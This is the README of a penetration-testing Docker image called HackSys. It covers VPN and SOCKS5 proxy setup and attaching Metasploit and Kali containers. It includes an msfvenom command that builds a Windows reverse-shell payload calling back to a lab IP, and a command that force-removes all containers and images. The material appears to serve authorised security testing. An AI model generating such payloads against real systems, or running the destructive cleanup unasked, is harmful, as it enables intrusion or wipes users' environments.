[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/antfie/HackSys/blob/master/LICENSE)

# HackSys

HackSys is a Docker image Anthony uses for penetration testing. It's main features are:

* Alpine based
* 3.59GB
* Zsh
* Lightweight with several security tools installed
* Development tools installed: Python, Go
* Easy to add in new capabilities via `apk add`
* Has a built-in SOCKS5 proxy (via SSH tunnel)

## Running

First pull down the latest container:

```
docker pull antfie/hacksys
```

### VPN

Replace `antfie.ovpn` with your openVPN configuration file and run the main VPN container with this:

```
docker run -it --rm -v $PWD/antfie.ovpn:/app/vpn --cap-add=NET_ADMIN --device /dev/net/tun --name vpn -p 9000-9100:9000-9100 --sysctl net.ipv6.conf.all.disable_ipv6=0 --entrypoint openvpn antfie/hacksys vpn
```

### SOCKS5 Proxy (For Burp)

```
docker run --rm -it --network=container:vpn --name proxy --entrypoint ssh-proxy antfie/hacksys
```

### General Host

Use this command for most activities:

```
docker run --rm -it --network=container:vpn -v $PWD:/app antfie/hacksys
```

To mount stuff e.g. NFS shares you will need to add this parameter `--cap-add SYS_ADMIN`.

### Other Tools

It's easy to attach other tools to the VPN container to make use of the VPN connection.

#### Metasploit

```
docker run --rm -it --network=container:vpn -v $PWD:/app metasploitframework/metasploit-framework
```

#### MSF Venom

```
docker run --rm -it --network=container:vpn -v $PWD:/app --entrypoint bash metasploitframework/metasploit-framework
```

To use MSF Venom:

```
./msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.32 LPORT=4189 -f csharp > /app/x
```

#### Kali

```
docker run --rm -it --network=container:vpn -v $PWD:/app kalilinux/kali-rolling
```

## Building

First update your images. Feel free to omit metasploit and/or kali if not desired:

```
docker pull alpine
docker pull metasploitframework/metasploit-framework
docker pull kalilinux/kali-rolling
```

Then build:

```
docker build -t antfie/hacksys .
```

## Docker Maintenance

Remove all containers and images:

```
docker rm -f $(docker ps -a -q)
docker rmi $(docker images -q)
```
